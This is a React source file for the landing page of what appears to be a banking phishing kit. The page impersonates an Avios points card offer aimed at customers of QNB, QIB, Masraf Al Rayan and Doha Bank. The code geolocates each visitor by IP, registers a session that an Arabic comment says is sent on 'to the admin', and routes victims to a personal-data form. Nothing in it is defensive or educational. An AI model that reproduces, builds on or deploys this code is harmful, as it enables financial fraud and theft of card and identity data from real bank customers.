import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";

const bankImages = {
  all: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
  qnb: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
};

const cards = [
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/hxhwkMwt/IMG-20260714-WA0003.jpg" },
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/ZRp4ZFQz/IMG-20260714-WA0002.jpg" },
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/zVfXCPrs/IMG-20260714-WA0004.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/BDhRQrT/IMG-20260714-WA0005.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/PGg2Bw30/IMG-20260714-WA0006.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/0Rg7qXHv/IMG-20260714-WA0007.jpg" },
  { bank: "rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", img: "https://i.ibb.co/99tzZcZJ/IMG-20260714-WA0001.jpg" },
  { bank: "rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", img: "https://i.ibb.co/tpKx6xLM/IMG-20260714-WA0000.jpg" },
  { bank: "doha", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", img: "https://i.ibb.co/RpGjpb8W/doha-bank-black-card-384x241.jpg" },
  { bank: "doha", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", img: "https://i.ibb.co/TMCDtHS7/doha-bank-burgundy-card-384x241-1.jpg" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const { language, setLanguage } = useLanguage();
  const [bankSelect, setBankSelect] = useState("all");
  const [mainCardImage, setMainCardImage] = useState(bankImages.all);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [userCountry, setUserCountry] = useState("Qatar");
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  useEffect(() => {
    // جلب دولة المستخدم تلقائياً باستخدام أكثر من مصدر لضمان النجاح
    const fetchCountry = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.country_name) {
          setUserCountry(data.country_name);
          return;
        }
      } catch (e) {
        console.log("ipapi failed, trying backup...");
      }

      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.country) {
          setUserCountry(data.country);
        }
      } catch (e) {
        console.error("Backup country fetch failed");
      }
    };

    fetchCountry();

    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % 2);
    }, 3000);
    return () => clearInterval(timer);
  }, []);

  const updatePage = (bankType: string) => {
    setBankSelect(bankType);
    setMainCardImage(bankImages[bankType as keyof typeof bankImages]);
  };

  const startSession = async (selectedBank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", selectedBank);
    
    // إظهار تنبيه بسيط للمستخدم أو لودر (اختياري)
    console.log("Starting session for bank:", selectedBank, "from country:", userCountry);
    
    try {
      // ننتظر إنشاء الجلسة في قاعدة البيانات قبل الانتقال لضمان وصول البيانات للآدمن فوراً
      await createSessionMutation.mutateAsync({
        sessionId,
        selectedBank,
        country: userCountry,
      });
      setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
    } catch (error) {
      console.error("Error creating session in DB:", error);
      // حتى لو فشل جلب الدولة أو الإرسال، ننتقل لضمان عدم توقف تجربة المستخدم
      setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
    }
  };

  const goToPersonalData = () => {
    if (bankSelect !== "all") {
      startSession(bankSelect);
    } else {
      alert(isArabic ? "يرجى اختيار البنك أولاً" : "Please select your bank first");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);

  return (
    <div className="page-wrapper">
      <style>{`
        .page-wrapper { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; min-height: 100vh; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; position: relative; z-index: 1000; box-sizing: border-box; width: 100%; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 5px; }
        .lang-btn { background-color: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .hero-slider { width: 100%; height: 200px; position: relative; overflow: hidden; }
        .hero-slider img { width: 100%; height: 100%; object-fit: cover; position: absolute; transition: opacity 1s; opacity: 0; }
        .hero-slider img.active { opacity: 1; }
        .container { padding: 20px; }
        .bank-selector { background: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .bank-selector select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        .main-card { width: 100%; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .action-box { background: white; padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; border-top: 5px solid #8C0032; }
        .action-box h2 { margin: 0 0 10px 0; font-size: 18px; color: #333; }
        .action-box p { color: #666; font-size: 14px; margin-bottom: 15px; }
        .btn-primary { background: #8C0032; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; width: 100%; cursor: pointer; }
        .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
        .card-item { background: white; padding: 10px; border-radius: 10px; text-align: center; cursor: pointer; transition: 0.3s; }
        .card-item:hover { transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .card-item img.bank-logo { height: 30px; margin-bottom: 10px; }
        .card-item img.card-img { width: 100%; border-radius: 5px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>

      <header className="header">
        <div style={{ fontSize: "28px", color: "#8C0032" }}>&#9776;</div>
        <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" alt="Logo" />
        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
      </header>

      <div className="hero-slider">
        <img src="https://i.ibb.co/0RwDLqXq/h2-visa-cug-china.jpg" className={currentSlide === 0 ? "active" : ""} alt="Slide 1" />
        <img src="https://i.ibb.co/mCKNbdgW/PHL.jpg" className={currentSlide === 1 ? "active" : ""} alt="Slide 2" />
      </div>

      <div className="container">
        <div className="bank-selector">
          <label style={{ display: "block", marginBottom: "10px", fontWeight: "bold" }}>{isArabic ? "اختر بنكك" : "Select Your Bank"}</label>
          <select value={bankSelect} onChange={(e) => updatePage(e.target.value)}>
            <option value="all">{isArabic ? "كل البنوك" : "All Banks"}</option>
            <option value="qnb">{isArabic ? "بنك قطر الوطني (QNB)" : "Qatar National Bank (QNB)"}</option>
            <option value="qib">{isArabic ? "مصرف قطر الإسلامي (QIB)" : "Qatar Islamic Bank (QIB)"}</option>
            <option value="rayan">{isArabic ? "مصرف الريان" : "Masraf Al Rayan"}</option>
            <option value="doha">{isArabic ? "بنك الدوحة" : "Doha Bank"}</option>
          </select>
        </div>

        <img src={mainCardImage} className="main-card" alt="Main Card" />

        <div className="action-box">
          <h2>{isArabic ? "أضف بطاقة الدفع لحسابك" : "Add Payment Card to Your Account"}</h2>
          <p>{isArabic ? "أضف بطاقات الدفع من نوع Visa و Mastercard لحساب عضويتك واجمع نقاط أفيوس." : "Add Visa and Mastercard payment cards to your membership account and collect Avios points."}</p>
          <button onClick={goToPersonalData} className="btn-primary">{isArabic ? "ابدأ الآن" : "Start Now"}</button>
        </div>

        <div className="card-grid">
          {filteredCards.map((card, index) => (
            <div key={index} className="card-item" onClick={() => startSession(card.bank)}>
              <img src={card.logo} className="bank-logo" alt="Bank Logo" />
              <img src={card.img} className="card-img" alt="Card" />
              <p style={{ fontSize: "12px", color: "#8C0032", fontWeight: "bold", marginTop: "10px" }}>{isArabic ? "اطلبها الآن" : "Order Now"}</p>
            </div>
          ))}
        </div>
      </div>

      <img src={footerImage} className="footer-image" alt="Footer" />
    </div>
  );
}
